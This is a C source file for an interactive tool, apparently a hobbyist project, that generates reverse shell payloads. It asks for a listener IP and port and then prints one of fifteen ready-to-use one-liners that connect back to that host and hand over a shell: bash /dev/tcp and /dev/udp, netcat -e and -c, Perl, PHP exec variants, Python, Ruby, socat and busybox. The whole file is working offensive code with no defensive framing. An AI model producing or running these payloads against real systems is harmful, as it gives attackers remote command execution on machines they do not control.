#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_ATTEMPTS 3

void print_banner() {
    printf("\n"
           "██╗      ██████╗ ███████╗████████╗███████╗███████╗ ██████╗\n"
           "██║     ██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔════╝\n"
           "██║     ██║   ██║███████╗   ██║   ███████╗█████╗  ██║     \n"
           "██║     ██║   ██║╚════██║   ██║   ╚════██║██╔══╝  ██║     \n"
           "███████╗╚██████╔╝███████║   ██║   ███████║███████╗╚██████╗\n"
           "╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═════╝\n"
           "                                                  \n\n"
           "A Simple Reverse Shell Payload Generator\n\n"
           "                                  BY SHARAFU\n");
}

int validate_ip(const char *ip) {
    int num, dots = 0;
    char *copy_ip = strdup(ip);
    char *segment = strtok(copy_ip, ".");

    while (segment) {
        if (!sscanf(segment, "%d", &num) || num < 0 || num > 255) {
            free(copy_ip);
            return 0;
        }
        segment = strtok(NULL, ".");
        dots++;
    }
    free(copy_ip);
    return dots == 4;
}

void check_reserved_port(int port) {
    switch (port) {
        case 21: printf("\nWarning: Port %d is commonly used for FTP services.\n", port); break;
        case 22: printf("\nWarning: Port %d is commonly used for SSH services.\n", port); break;
        case 23: printf("\nWarning: Port %d is commonly used for Telnet services.\n", port); break;
        case 25: printf("\nWarning: Port %d is commonly used for SMTP services.\n", port); break;
        case 53: printf("\nWarning: Port %d is commonly used for DNS services.\n", port); break;
        case 80: printf("\nWarning: Port %d is commonly used for HTTP services.\n", port); break;
        default: break;
    }
    printf("For custom services, it’s best to use ports in the dynamic/private range (49152-65535) "
           "or the registered port range (1024-49151).\n");
}

void clear_input_buffer() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
}

void get_ip_port(char *ip, int *port) {
    int attempts = MAX_ATTEMPTS;
    while (attempts > 0) {
        printf("Enter Listener IP: ");
        scanf("%15s", ip);
        if (validate_ip(ip)) break;
        else {
            printf("Invalid IP. Please enter a valid IPv4 address.\n");
            attempts--;
        }
    }
    if (attempts == 0) {
        printf("Too many invalid attempts. Don’t know what an IP address is?\n"
               "https://www.fortinet.com/resources/cyberglossary/what-is-ip-address\n");
        exit(1);
    }

    attempts = MAX_ATTEMPTS;
    while (attempts > 0) {
        printf("Enter Listener port: ");
        if (scanf("%d", port) == 1 && *port >= 1 && *port <= 65535) {
            check_reserved_port(*port);
            break;
        } else {
            printf("Which port is that!? Please enter a valid port.\n");
            clear_input_buffer();
            attempts--;
        }
    }
    if (attempts == 0) {
        printf("Who TOLD Y0U ABOUT R3VERSE SHELL  SkIDDIEE\n");
        exit(1);
    }
}

void show_menu() {
    printf("\nSelect payload option:\n"
           "1. Bash -i    5. nc -c           9. PHP system   13. Ruby\n"
           "2. Bash 5     6. Perl            10. PHP popen   14. Socat (tty)\n"
           "3. Bash UDP   7. PHP exec        11. Python      15. busybox nc -e\n"
           "4. nc         8. PHP shell_exec  12. Python3\n");
}

int get_user_choice() {
    int choice, attempts = MAX_ATTEMPTS;
    while (attempts > 0) {
        printf("Select payload option from listed here (1-15): ");
        if (scanf("%d", &choice) == 1 && choice >= 1 && choice <= 15) {
            return choice;
        } else {
            printf("Invalid input. Please choose an option between 1 and 15.\n");
            clear_input_buffer();
            attempts--;
        }
    }
    printf("\n\nNaadin Nanmakane Ponmakane Muthaayavane\nMinnum Sooriyanum Chandhiranum Onnaayavane.\n"
           "Kaalam Kaathuvacha Rakshakane Samhaarakane\nNjangalkkannanaayi Vannavaneeeee\n");
    exit(1);
}

void generate_shell(char *ip, int port, int choice) {
    char command[512];
    switch (choice) {
        case 1: snprintf(command, sizeof(command), "sh -i >& /dev/tcp/%s/%d 0>&1", ip, port); break;
        case 2: snprintf(command, sizeof(command), "sh -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5", ip, port); break;
        case 3: snprintf(command, sizeof(command), "sh -i >& /dev/udp/%s/%d 0>&1", ip, port); break;
        case 4: snprintf(command, sizeof(command), "nc %s %d -e sh", ip, port); break;
        case 5: snprintf(command, sizeof(command), "nc -c sh %s %d", ip, port); break;
        case 6: snprintf(command, sizeof(command), "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'", ip, port); break;
        case 7: snprintf(command, sizeof(command), "php -r '$sock=fsockopen(\"%s\",%d);exec(\"sh <&3 >&3 2>&3\");'", ip, port); break;
        case 8: snprintf(command, sizeof(command), "php -r '$sock=fsockopen(\"%s\",%d);shell_exec(\"sh <&3 >&3 2>&3\");'", ip, port); break;
        case 9: snprintf(command, sizeof(command), "php -r '$sock=fsockopen(\"%s\",%d);system(\"sh <&3 >&3 2>&3\");'", ip, port); break;
        case 10: snprintf(command, sizeof(command), "php -r '$sock=fsockopen(\"%s\",%d);popen(\"sh <&3 >&3 2>&3\", \"r\");'", ip, port); break;
        case 11: snprintf(command, sizeof(command), "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"sh\")'", ip, port); break;
        case 12: snprintf(command, sizeof(command), "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"sh\")'", ip, port); break;
        case 13: snprintf(command, sizeof(command), "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))'", ip, port); break;
        case 14: snprintf(command, sizeof(command), "socat TCP:%s:%d EXEC:'sh',pty,stderr,setsid,sigint,sane", ip, port); break;
        case 15: snprintf(command, sizeof(command), "busybox nc -e sh %s %d", ip, port); break; }
        printf("\nHERE IS YOUR REVERSE SHELL PAYLOAD :\n\n%s\n", command); }
        int main() {
    char ip[16];
    int port;

    print_banner();
    get_ip_port(ip, &port);
    show_menu();
    int choice = get_user_choice();
    generate_shell(ip, port, choice);

    return 0;
}
